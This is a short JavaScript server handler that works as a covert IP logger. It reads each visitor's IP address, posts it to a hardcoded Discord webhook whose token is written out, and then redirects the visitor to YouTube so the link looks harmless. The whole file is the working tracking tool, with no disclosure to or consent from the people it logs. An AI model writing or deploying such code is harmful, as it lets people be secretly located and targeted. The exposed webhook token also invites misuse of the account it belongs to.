export default async function handler(req, res) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;

  const webhookURL =
    'https://discord.com/api/webhooks/1505570928007057630/fHIzbKRE8m8Ziso_WzM5Cifde8WM8cE-sfE-Ceq8C1e4qvA-v0w5GlY35mW0ySgQe6H9';

  const payload = {
    content: `IP Address: ${ip}`,
  };

  await fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
  });

  res.writeHead(302, { Location: 'https://www.youtube.com' });
  res.end();
}
